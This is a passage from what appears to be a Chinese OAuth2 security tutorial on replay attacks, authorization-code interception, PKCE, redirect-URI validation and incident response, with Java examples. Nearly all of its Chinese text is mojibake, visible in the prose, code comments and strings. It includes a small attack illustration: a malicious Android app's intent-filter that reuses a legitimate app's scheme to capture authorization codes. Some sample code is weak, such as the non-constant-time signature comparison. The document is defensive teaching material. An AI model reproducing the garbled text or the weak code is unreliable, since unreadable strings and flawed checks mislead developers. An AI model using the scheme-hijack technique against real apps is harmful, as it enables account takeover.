        if (nonceStore.exists(nonce)) {
            return ResponseEntity.status(403)
                .body("æ£€æµ‹åˆ°é‡æ”¾æ”»å‡»");
        }
        
        // å¤„ç†è¯·æ±‚
        // ...
        
        // ä¿å­˜Nonceï¼Œé˜²æ­¢é‡æ”¾
        nonceStore.save(nonce, 5 * 60);  // 5åˆ†é’Ÿè¿‡æœŸ
        
        return ResponseEntity.ok("æˆåŠŸ");
    }
}
```

**â‘¡ æ—¶é—´æˆ³+ç­¾å**
```java
// å®¢æˆ·ç«¯ç”Ÿæˆè¯·æ±‚ç­¾å
public String generateSignature(String data, long timestamp, String secret) {
    String message = data + timestamp;
    return hmacSha256(message, secret);
}

// æœåŠ¡å™¨éªŒè¯
public boolean verifyRequest(String data, long timestamp, String signature) {
    // æ£€æŸ¥æ—¶é—´æˆ³
    if (System.currentTimeMillis() - timestamp > 5 * 60 * 1000) {
        return false;  // è¯·æ±‚è¿‡æœŸ
    }
    
    // éªŒè¯ç­¾å
    String expectedSignature = generateSignature(data, timestamp, secret);
    return signature.equals(expectedSignature);
}
```

**â‘¢ Tokené™åˆ¶ä½¿ç”¨æ¬¡æ•°**
```java
@Component
public class TokenUsageTracker {
    
    // Tokenä½¿ç”¨æ¬¡æ•°é™åˆ¶
    private Map<String, Integer> tokenUsageCount = new ConcurrentHashMap<>();
    
    public boolean canUseToken(String token) {
        int count = tokenUsageCount.getOrDefault(token, 0);
        
        if (count >= 10) {  // æœ€å¤šä½¿ç”¨10æ¬¡
            logger.warn("Tokenä½¿ç”¨æ¬¡æ•°è¶…é™ï¼Œå¯èƒ½é­å—é‡æ”¾æ”»å‡»");
            return false;
        }
        
        tokenUsageCount.put(token, count + 1);
        return true;
    }
}
```

**â‘£ è¯·æ±‚åºåˆ—å·**
```
ä¸ºæ¯ä¸ªè¯·æ±‚åˆ†é…é€’å¢çš„åºåˆ—å·ï¼š

è¯·æ±‚1ï¼šseq=1 â†’ æœåŠ¡å™¨æ¥å—ï¼Œè®°å½•æœ€å¤§åºåˆ—å·=1
è¯·æ±‚2ï¼šseq=2 â†’ æœåŠ¡å™¨æ¥å—ï¼Œè®°å½•æœ€å¤§åºåˆ—å·=2
é‡æ”¾ï¼šseq=1 â†’ å°äºå½“å‰æœ€å¤§åºåˆ—å·ï¼Œæ‹’ç»ï¼
```

---

## 6. ğŸ“¡ æˆæƒç æ‹¦æˆªæ”»å‡»


### 6.1 ä»€ä¹ˆæ˜¯æˆæƒç æ‹¦æˆª


**é€šä¿—è§£é‡Š**ï¼š
æˆæƒç æ‹¦æˆªå°±åƒä½ è®©æœ‹å‹å¸®ä½ å–å¿«é€’ï¼Œå¿«é€’å‘˜æŠŠå¿«é€’ç»™äº†ä½ æœ‹å‹åï¼Œä½ æœ‹å‹å·å·æŠŠå¿«é€’æ‹†å¼€ï¼Œå–èµ°äº†é‡Œé¢çš„ä¸œè¥¿ã€‚

**åœ¨OAuth2.0ä¸­çš„è¡¨ç°**ï¼š
```
æ­£å¸¸æµç¨‹ï¼š
ç”¨æˆ·æˆæƒ â†’ æˆæƒæœåŠ¡å™¨è¿”å›æˆæƒç  â†’ ä½ çš„åº”ç”¨ç”¨æˆæƒç æ¢Token

æ‹¦æˆªæ”»å‡»ï¼š
ç”¨æˆ·æˆæƒ â†’ æˆæƒæœåŠ¡å™¨è¿”å›æˆæƒç  â†’ é»‘å®¢æ‹¦æˆªæˆæƒç 
                                    â†“
                          é»‘å®¢ç”¨æˆæƒç æ¢Token
                                    â†“
                          é»‘å®¢è·å¾—ç”¨æˆ·è®¿é—®æƒé™
```

### 6.2 æˆæƒç æ‹¦æˆªçš„æ”»å‡»æ–¹å¼


**æ”»å‡»åœºæ™¯å¯¹æ¯”**ï¼š

| æ”»å‡»æ–¹å¼ | **åŸç†** | **æ”»å‡»éš¾åº¦** | **å±å®³ç¨‹åº¦** |
|---------|---------|------------|-------------|
| **æ¶æ„Appæ‹¦æˆª** | `æ¶æ„Appç›‘å¬å›è°ƒURL` | ğŸŸ¡ ä¸­ | ğŸ”´ é«˜ |
| **ä¸­é—´äººæ”»å‡»** | `HTTPä¼ è¾“è¢«æ‹¦æˆª` | ğŸŸ  è¾ƒé«˜ | ğŸ”´ é«˜ |
| **æµè§ˆå™¨åŠ«æŒ** | `æ¶æ„æµè§ˆå™¨æ’ä»¶çªƒå–` | ğŸŸ¡ ä¸­ | ğŸŸ  è¾ƒé«˜ |
| **Redirect URIç¯¡æ”¹** | `ä¿®æ”¹å›è°ƒåœ°å€` | ğŸŸ¢ ä½ | ğŸ”´ é«˜ |

**æ¶æ„Appæ‹¦æˆªç¤ºä¾‹**ï¼š
```
Androidç¯å¢ƒï¼š

æ­£å¸¸Appçš„é…ç½®ï¼š
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <data android:scheme="myapp"
          android:host="callback" />
</intent-filter>

æ¶æ„Appçš„é…ç½®ï¼ˆç›¸åŒschemeï¼‰ï¼š
<intent-filter>
    <action android:name="android.intent.action.VIEW" />
    <data android:scheme="myapp"      â† æ•…æ„ç›¸åŒï¼
          android:host="callback" />
</intent-filter>

ç»“æœï¼šæˆæƒç å¯èƒ½è¢«æ¶æ„Appæ‹¦æˆª
```

### 6.3 ä¸­é—´äººæ”»å‡»è¯¦è§£


**æ”»å‡»è¿‡ç¨‹å›¾ç¤º**ï¼š
```
ç¬¬1æ­¥ï¼šç”¨æˆ·å‘èµ·æˆæƒ
ç”¨æˆ·è®¾å¤‡ ----æˆæƒè¯·æ±‚----> æˆæƒæœåŠ¡å™¨
              â†“
          WiFiè·¯ç”±å™¨
              â†“
          é»‘å®¢ç›‘å¬

ç¬¬2æ­¥ï¼šæˆæƒæœåŠ¡å™¨è¿”å›æˆæƒç 
æˆæƒæœåŠ¡å™¨ --é‡å®šå‘åˆ°: myapp://callback?code=abc123--> ç”¨æˆ·è®¾å¤‡
                              â†‘
                          é»‘å®¢æ‹¦æˆª
                              â†“
                        é»‘å®¢è·å¾—æˆæƒç abc123

ç¬¬3æ­¥ï¼šé»‘å®¢æŠ¢å…ˆä½¿ç”¨æˆæƒç 
é»‘å®¢ --code=abc123--> æˆæƒæœåŠ¡å™¨ --> è¿”å›Tokenç»™é»‘å®¢
                                    â†“
                              ç”¨æˆ·çš„Tokenè¢«ç›—
```

### 6.4 æˆæƒç æ‹¦æˆªçš„å½±å“


**âš ï¸ å±å®³åˆ†æ**ï¼š
- âœ— **è´¦å·è¢«åŠ«æŒ**ï¼šé»‘å®¢è·å¾—ç”¨æˆ·çš„Access Token
- âœ— **éšç§æ³„éœ²**ï¼šé»‘å®¢å¯ä»¥è®¿é—®ç”¨æˆ·çš„ä¸ªäººä¿¡æ¯
- âœ— **æ¶æ„æ“ä½œ**ï¼šé»‘å®¢ä»¥ç”¨æˆ·èº«ä»½è¿›è¡Œæ“ä½œ
- âœ— **ç”¨æˆ·æ— æ„ŸçŸ¥**ï¼šç”¨æˆ·å¯èƒ½å®Œå…¨ä¸çŸ¥é“è¢«æ”»å‡»

### 6.5 å¦‚ä½•æ£€æµ‹æˆæƒç æ‹¦æˆª


**ğŸ” æ£€æµ‹æ–¹æ³•**ï¼š

**æ–¹æ³•ä¸€ï¼šCodeä½¿ç”¨ç›‘æ§**
```java
@Component
public class AuthCodeMonitor {
    
    private Map<String, AuthCodeInfo> codeUsage = new ConcurrentHashMap<>();
    
    public void recordCodeGeneration(String code, String clientId) {
        codeUsage.put(code, new AuthCodeInfo(
            clientId, 
            System.currentTimeMillis(), 
            false
        ));
    }
    
    public boolean detectAnomaly(String code, String clientId) {
        AuthCodeInfo info = codeUsage.get(code);
        
        if (info == null) {
            logger.warn("ä½¿ç”¨æœªçŸ¥çš„æˆæƒç ");
            return true;
        }
        
        if (info.isUsed) {
            logger.warn("æ£€æµ‹åˆ°æˆæƒç é‡å¤ä½¿ç”¨ï¼Œå¯èƒ½è¢«æ‹¦æˆª");
            return true;
        }
        
        if (!info.clientId.equals(clientId)) {
            logger.warn("æˆæƒç ä¸å®¢æˆ·ç«¯ä¸åŒ¹é…ï¼Œå¯èƒ½è¢«ç›—ç”¨");
            return true;
        }
        
        return false;
    }
}
```

**æ–¹æ³•äºŒï¼šIPåœ°å€éªŒè¯**
```java
public boolean verifyIPConsistency(String codeRequestIP, String tokenRequestIP) {
    if (!codeRequestIP.equals(tokenRequestIP)) {
        logger.warn("æˆæƒç è¯·æ±‚IPä¸Tokenè¯·æ±‚IPä¸ä¸€è‡´: {} -> {}", 
            codeRequestIP, tokenRequestIP);
        return false;
    }
    return true;
}
```

### 6.6 æˆæƒç æ‹¦æˆªé˜²æŠ¤æ–¹æ¡ˆ


**ğŸ›¡ï¸ é˜²æŠ¤æªæ–½**ï¼š

**â‘  PKCEï¼ˆProof Key for Code Exchangeï¼‰**ï¼ˆæœ€é‡è¦ï¼‰

**PKCEåŸç†å›¾è§£**ï¼š
```
PKCEå°±åƒæ˜¯"åŒé‡å¯†ç éªŒè¯"ï¼š

ç¬¬1æ­¥ï¼šå®¢æˆ·ç«¯ç”Ÿæˆå¯†ç æŒ‘æˆ˜
å®¢æˆ·ç«¯ç”Ÿæˆéšæœºå¯†ç (code_verifier) â†’ è®¡ç®—æ‘˜è¦(code_challenge)
                                    â†“
                              å‘é€æ‘˜è¦ç»™æˆæƒæœåŠ¡å™¨

ç¬¬2æ­¥ï¼šæˆæƒæœåŠ¡å™¨è¿”å›æˆæƒç 
æˆæƒæœåŠ¡å™¨ â†’ è¿”å›æˆæƒç  â†’ ï¼ˆå³ä½¿è¢«æ‹¦æˆªï¼Œé»‘å®¢ä¹Ÿæ²¡æœ‰åŸå§‹å¯†ç ï¼‰

ç¬¬3æ­¥ï¼šå®¢æˆ·ç«¯ç”¨æˆæƒç +åŸå§‹å¯†ç æ¢Token
å®¢æˆ·ç«¯ â†’ å‘é€æˆæƒç  + code_verifier â†’ æˆæƒæœåŠ¡å™¨éªŒè¯å¯†ç 
                                      â†“
                              å¯†ç åŒ¹é…æ‰è¿”å›Token
```

**PKCEå®ç°ä»£ç **ï¼š
```java
// æ­¥éª¤1ï¼šç”Ÿæˆcode_verifierå’Œcode_challenge
public Map<String, String> generatePKCE() {
    // ç”Ÿæˆéšæœºå­—ç¬¦ä¸²ä½œä¸ºcode_verifier
    String codeVerifier = generateRandomString(128);
    
    // è®¡ç®—code_challenge (SHA256æ‘˜è¦)
    String codeChallenge = base64UrlEncode(
        sha256(codeVerifier)
    );
    
    Map<String, String> pkce = new HashMap<>();
    pkce.put("code_verifier", codeVerifier);
    pkce.put("code_challenge", codeChallenge);
    pkce.put("code_challenge_method", "S256");
    
    return pkce;
}

// æ­¥éª¤2ï¼šæˆæƒè¯·æ±‚æ—¶å‘é€code_challenge
String authUrl = "https://oauth.example.com/authorize?" +
    "client_id=123&" +
    "redirect_uri=myapp://callback&" +
    "code_challenge=" + codeChallenge + "&" +
    "code_challenge_method=S256";

// æ­¥éª¤3ï¼šæ¢Tokenæ—¶éªŒè¯code_verifier
@PostMapping("/token")
public ResponseEntity<?> exchangeToken(
    @RequestParam String code,
    @RequestParam String codeVerifier) {
    
    // è·å–ä¹‹å‰ä¿å­˜çš„code_challenge
    String savedChallenge = getCodeChallenge(code);
    
    // éªŒè¯code_verifier
    String computedChallenge = base64UrlEncode(sha256(codeVerifier));
    
    if (!savedChallenge.equals(computedChallenge)) {
        return ResponseEntity.status(400)
            .body("PKCEéªŒè¯å¤±è´¥ï¼Œå¯èƒ½é­å—æ‹¦æˆªæ”»å‡»");
    }
    
    // éªŒè¯é€šè¿‡ï¼Œè¿”å›Token
    return ResponseEntity.ok(generateToken());
}
```

**â‘¡ ä¸¥æ ¼çš„Redirect URIéªŒè¯**
```java
@Component
public class RedirectURIValidator {
    
    // ç™½åå•æ–¹å¼
    private Set<String> allowedRedirectURIs = Set.of(
        "https://myapp.com/callback",
        "myapp://oauth/callback"
    );
    
    public boolean isValidRedirectURI(String uri) {
        // ç²¾ç¡®åŒ¹é…ï¼Œä¸å…è®¸é€šé…ç¬¦
        if (!allowedRedirectURIs.contains(uri)) {
            logger.warn("éæ³•çš„redirect_uri: {}", uri);
            return false;
        }
        
        // é¢å¤–æ£€æŸ¥URIæ ¼å¼
        if (!uri.startsWith("https://") && !uri.startsWith("myapp://")) {
            return false;
        }
        
        return true;
    }
}
```

**â‘¢ æˆæƒç çŸ­æœŸæœ‰æ•ˆ**
```java
@Component
public class AuthCodeManager {
    
    public String generateAuthCode(String clientId) {
        String code = UUID.randomUUID().toString();
        
        // æˆæƒç åªæœ‰60ç§’æœ‰æ•ˆæœŸ
        redisTemplate.opsForValue().set(
            "auth_code:" + code,
            clientId,
            60,
            TimeUnit.SECONDS
        );
        
        return code;
    }
    
    public boolean isCodeValid(String code) {
        String clientId = redisTemplate.opsForValue().get("auth_code:" + code);
        return clientId != null;
    }
}
```

**â‘£ æˆæƒç åªèƒ½ä½¿ç”¨ä¸€æ¬¡**
```java
public String exchangeCode(String code) {
    // æ£€æŸ¥æˆæƒç æ˜¯å¦å­˜åœ¨
    String clientId = redisTemplate.opsForValue().get("auth_code:" + code);
    
    if (clientId == null) {
        throw new InvalidGrantException("æˆæƒç æ— æ•ˆæˆ–å·²ä½¿ç”¨");
    }
    
    // ç«‹å³åˆ é™¤æˆæƒç ï¼Œé˜²æ­¢é‡å¤ä½¿ç”¨
    redisTemplate.delete("auth_code:" + code);
    
    // ç”ŸæˆToken
    return generateAccessToken(clientId);
}
```

---

## 7. ğŸ›¡ï¸ ç»¼åˆé˜²æŠ¤ç­–ç•¥


### 7.1 çºµæ·±é˜²å¾¡ä½“ç³»


**å®‰å…¨é˜²æŠ¤å±‚æ¬¡å›¾**ï¼š
```
ç¬¬1å±‚ï¼šä¼ è¾“å±‚å®‰å…¨
    â†“ HTTPSåŠ å¯†ä¼ è¾“
    â†“ TLS 1.2+

ç¬¬2å±‚ï¼šè®¤è¯å±‚å®‰å…¨
    â†“ å¼ºéšæœºStateé˜²CSRF
    â†“ PKCEé˜²æˆæƒç æ‹¦æˆª
    â†“ ä¸¥æ ¼çš„Redirect URIéªŒè¯

ç¬¬3å±‚ï¼šTokenå®‰å…¨
    â†“ HttpOnly Cookieå­˜å‚¨
    â†“ çŸ­æœŸæœ‰æ•ˆ+åˆ·æ–°æœºåˆ¶
    â†“ ä½¿ç”¨é™åˆ¶ï¼ˆIPã€æ¬¡æ•°ï¼‰

ç¬¬4å±‚ï¼šåº”ç”¨å±‚å®‰å…¨
    â†“ è¾“å…¥éªŒè¯ä¸è¾“å‡ºè½¬ä¹‰
    â†“ CSPå†…å®¹å®‰å…¨ç­–ç•¥
    â†“ Nonceé˜²é‡æ”¾

ç¬¬5å±‚ï¼šç›‘æ§ä¸å“åº”
    â†“ å¼‚å¸¸æ£€æµ‹ä¸å‘Šè­¦
    â†“ å¿«é€Ÿæ’¤é”€æœºåˆ¶
    â†“ å®‰å…¨å®¡è®¡æ—¥å¿—
```

### 7.2 å®‰å…¨é…ç½®æ¸…å•


**âœ… å¿…é¡»å®æ–½çš„å®‰å…¨æªæ–½**ï¼š

**ä¼ è¾“å®‰å…¨**
- [x] å¼ºåˆ¶HTTPSï¼Œç¦ç”¨HTTP
- [x] ä½¿ç”¨TLS 1.2æˆ–æ›´é«˜ç‰ˆæœ¬
- [x] é…ç½®HSTSå¤´

**è®¤è¯å®‰å…¨**
- [x] ä½¿ç”¨Stateå‚æ•°é˜²CSRF
- [x] å®æ–½PKCEé˜²æˆæƒç æ‹¦æˆª
- [x] ä¸¥æ ¼éªŒè¯Redirect URIï¼ˆç²¾ç¡®åŒ¹é…ï¼‰

**Tokenå®‰å…¨**
- [x] Tokenå­˜å‚¨åœ¨HttpOnly Cookie
- [x] è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´ï¼ˆ15-60åˆ†é’Ÿï¼‰
- [x] ä½¿ç”¨Refresh Tokenåˆ·æ–°
- [x] Tokenç»‘å®šIPåœ°å€

**è¾“å…¥è¾“å‡ºå®‰å…¨**
- [x] æ‰€æœ‰è¾“å‡ºè¿›è¡ŒHTMLè½¬ä¹‰
- [x] é…ç½®CSPç­–ç•¥
- [x] éªŒè¯æ‰€æœ‰ç”¨æˆ·è¾“å…¥

**é˜²é‡æ”¾æ”»å‡»**
- [x] ä½¿ç”¨Nonceä¸€æ¬¡æ€§ä»¤ç‰Œ
- [x] è¯·æ±‚æ—¶é—´æˆ³éªŒè¯
- [x] æˆæƒç åªèƒ½ä½¿ç”¨ä¸€æ¬¡

**ç›‘æ§ä¸æ—¥å¿—**
- [x] è®°å½•æ‰€æœ‰å®‰å…¨äº‹ä»¶
- [x] æ—¥å¿—è„±æ•å¤„ç†
- [x] å¼‚å¸¸è¡Œä¸ºå‘Šè­¦

### 7.3 å®‰å…¨å¼€å‘æœ€ä½³å®è·µ


**ğŸ”¸ å¼€å‘è§„èŒƒ**ï¼š

```java
// â‘  ç»Ÿä¸€çš„å®‰å…¨é…ç½®ç±»
@Configuration
public class OAuth2SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // CSRFä¿æŠ¤
            .csrf().csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            
            // HTTPSå¼ºåˆ¶
            .requiresChannel().anyRequest().requiresSecure()
            
            // å®‰å…¨å¤´
            .and().headers()
                .contentSecurityPolicy("script-src 'self'")
                .and()
                .httpStrictTransportSecurity()
                    .maxAgeInSeconds(31536000)
                    .includeSubDomains(true);
                    
        return http.build();
    }
}

// â‘¡ ç»Ÿä¸€çš„å¼‚å¸¸å¤„ç†
@ControllerAdvice
public class SecurityExceptionHandler {
    
    @ExceptionHandler(CSRFException.class)
    public ResponseEntity<?> handleCSRF(CSRFException e) {
        logger.warn("CSRFæ”»å‡»æ£€æµ‹: {}", e.getMessage());
        return ResponseEntity.status(403).body("å®‰å…¨éªŒè¯å¤±è´¥");
    }
    
    @ExceptionHandler(TokenExpiredException.class)
    public ResponseEntity<?> handleTokenExpired(TokenExpiredException e) {
        logger.info("Tokenè¿‡æœŸ: {}", e.getMessage());
        return ResponseEntity.status(401).body("è¯·é‡æ–°ç™»å½•");
    }
}

// â‘¢ ç»Ÿä¸€çš„å®‰å…¨å·¥å…·ç±»
@Component
public class SecurityUtils {
    
    public static String escapeHtml(String input) {
        // HTMLè½¬ä¹‰
    }
    
    public static String generateSecureRandom() {
        // å®‰å…¨éšæœºæ•°ç”Ÿæˆ
    }
    
    public static String hashSHA256(String input) {
        // SHA256å“ˆå¸Œ
    }
}
```

### 7.4 åº”æ€¥å“åº”æ–¹æ¡ˆ


**ğŸš¨ å®‰å…¨äº‹ä»¶å“åº”æµç¨‹**ï¼š

```
å‘ç°å®‰å…¨äº‹ä»¶
    â†“
â‘  ç«‹å³è¯„ä¼°å½±å“èŒƒå›´
    â†“
â‘¡ æ‰§è¡Œåº”æ€¥æªæ–½ï¼š
   â€¢ æ’¤é”€å—å½±å“çš„Token
   â€¢ å°ç¦å¯ç–‘IP
   â€¢ ç¦ç”¨å—æ”»å‡»çš„åŠŸèƒ½
    â†“
â‘¢ é€šçŸ¥ç”¨æˆ·ï¼š
   â€¢ å¼ºåˆ¶é‡æ–°ç™»å½•
   â€¢ å‘é€å®‰å…¨æé†’
    â†“
â‘£ è°ƒæŸ¥åˆ†æï¼š
   â€¢ æŸ¥çœ‹æ—¥å¿—
   â€¢ åˆ†ææ”»å‡»æ‰‹æ³•
   â€¢ å®šä½æ¼æ´
    â†“
â‘¤ ä¿®å¤åŠ å›ºï¼š
   â€¢ ä¿®å¤æ¼æ´
   â€¢ åŠ å¼ºé˜²æŠ¤
   â€¢ å‡çº§å®‰å…¨ç­–ç•¥
    â†“
â‘¥ å¤ç›˜æ€»ç»“ï¼š
   â€¢ ç¼–å†™äº‹ä»¶æŠ¥å‘Š
   â€¢ ä¼˜åŒ–å“åº”æµç¨‹
   â€¢ å®‰å…¨åŸ¹è®­
```

**å¿«é€Ÿæ’¤é”€Tokenç¤ºä¾‹**ï¼š
```java
@Service
public class TokenRevocationService {
    
    // æ’¤é”€å•ä¸ªToken
    public void revokeToken(String token) {
        // åŠ å…¥é»‘åå•
        redisTemplate.opsForSet().add("revoked_tokens", token);
        
        // è®°å½•æ’¤é”€æ—¥å¿—
        logger.warn("Tokenå·²æ’¤é”€: {}", maskToken(token));
        
        // é€šçŸ¥ç”¨æˆ·
        notifyUser("æ‚¨çš„Tokenå·²è¢«æ’¤é”€ï¼Œè¯·é‡æ–°ç™»å½•");
    }
    
    // æ’¤é”€ç”¨æˆ·çš„æ‰€æœ‰Token
    public void revokeAllUserTokens(String userId) {
        List<String> tokens = getUserTokens(userId);
        
        for (String token : tokens) {
            revokeToken(token);
        }
        
        logger.warn("ç”¨æˆ·{}çš„æ‰€æœ‰Tokenå·²æ’¤é”€", userId);
    }
    
    // TokenéªŒè¯æ—¶æ£€æŸ¥é»‘åå•
    public boolean isTokenRevoked(String token) {
        return redisTemplate.opsForSet().isMember("revoked_tokens", token);
    }
}
```

---

## 8. ğŸ“‹ æ ¸å¿ƒè¦ç‚¹æ€»ç»“


### 8.1 å¿…é¡»æŒæ¡çš„å®‰å…¨æ¦‚å¿µ


```
ğŸ”¸ CSRFæ”»å‡»ï¼šä¼ªé€ ç”¨æˆ·è¯·æ±‚ â†’ ç”¨Stateå‚æ•°é˜²æŠ¤
ğŸ”¸ XSSæ”»å‡»ï¼šæ³¨å…¥æ¶æ„è„šæœ¬ â†’ è¾“å‡ºè½¬ä¹‰+CSPé˜²æŠ¤
ğŸ”¸ Tokenæ³„æ¼ï¼šå„ç§é€”å¾„æ³„éœ² â†’ HTTPS+HttpOnly Cookieé˜²æŠ¤
ğŸ”¸ é‡æ”¾æ”»å‡»ï¼šé‡å¤ä½¿ç”¨è¯·æ±‚ â†’ Nonce+æ—¶é—´æˆ³é˜²æŠ¤
ğŸ”¸ æˆæƒç æ‹¦æˆªï¼šæ‹¦æˆªæˆæƒç  â†’ PKCEé˜²æŠ¤
```

### 8.2 å…³é”®å®‰å…¨æªæ–½


**ğŸ›¡ï¸ äº”å¤§æ ¸å¿ƒé˜²æŠ¤**ï¼š
1. **Stateå‚æ•°**ï¼šé˜²æ­¢CSRFæ”»å‡»
2. **PKCE**ï¼šé˜²æ­¢æˆæƒç æ‹¦æˆª
3. **HTTPS**ï¼šé˜²æ­¢ç½‘ç»œçªƒå¬
4. **HttpOnly Cookie**ï¼šé˜²æ­¢XSSçªƒå–Token
5. **Nonce**ï¼šé˜²æ­¢é‡æ”¾æ”»å‡»

### 8.3 å®‰å…¨å¼€å‘å»ºè®®


**âš¡ å®è·µè¦ç‚¹**ï¼š
- **æœ€å°æƒé™åŸåˆ™**ï¼šTokenæƒé™æœ€å°åŒ–
- **çºµæ·±é˜²å¾¡**ï¼šå¤šå±‚å®‰å…¨æªæ–½
- **å®‰å…¨é»˜è®¤**ï¼šé»˜è®¤é…ç½®å¿…é¡»å®‰å…¨
- **æŒç»­ç›‘æ§**ï¼šå®æ—¶æ£€æµ‹å¼‚å¸¸
- **å¿«é€Ÿå“åº”**ï¼šå®‰å…¨äº‹ä»¶å¿«é€Ÿå¤„ç†

### 8.4 å¸¸è§é”™è¯¯ä¸é¿å‘


**âŒ å¸¸çŠ¯é”™è¯¯**ï¼š
```
Ã— åœ¨URLä¸­ä¼ é€’Token
Ã— Tokené•¿æœŸæœ‰æ•ˆä¸è¿‡æœŸ
Ã— ä½¿ç”¨localStorageå­˜å‚¨Token
Ã— ä¸éªŒè¯Stateå‚æ•°
Ã— æ²¡æœ‰å®æ–½PKCE
Ã— æ—¥å¿—ä¸­è®°å½•å®Œæ•´Token
Ã— HTTPä¼ è¾“æ•æ„Ÿä¿¡æ¯
```

**âœ… æ­£ç¡®åšæ³•**ï¼š
```
âœ“ Tokenæ”¾åœ¨Authorization Header
âœ“ çŸ­æœŸToken+Refreshæœºåˆ¶
âœ“ HttpOnly Cookieå­˜å‚¨
âœ“ ä¸¥æ ¼éªŒè¯State
âœ“ æ‰€æœ‰å®¢æˆ·ç«¯ä½¿ç”¨PKCE
âœ“ æ—¥å¿—è„±æ•å¤„ç†
âœ“ å¼ºåˆ¶HTTPS
```

**æ ¸å¿ƒè®°å¿†**ï¼š
- å®‰å…¨æ— å°äº‹ï¼Œæ¯ä¸ªç¯èŠ‚éƒ½è¦é‡è§†
- æ”»å‡»æ‰‹æ®µå¤šæ ·ï¼Œé˜²æŠ¤è¦å…¨é¢
- Stateã€PKCEã€HTTPSã€HttpOnlyæ˜¯æ ¸å¿ƒ
- ç›‘æ§æ£€æµ‹ä¸èƒ½å°‘ï¼Œåº”æ€¥å“åº”è¦å¿«é€Ÿ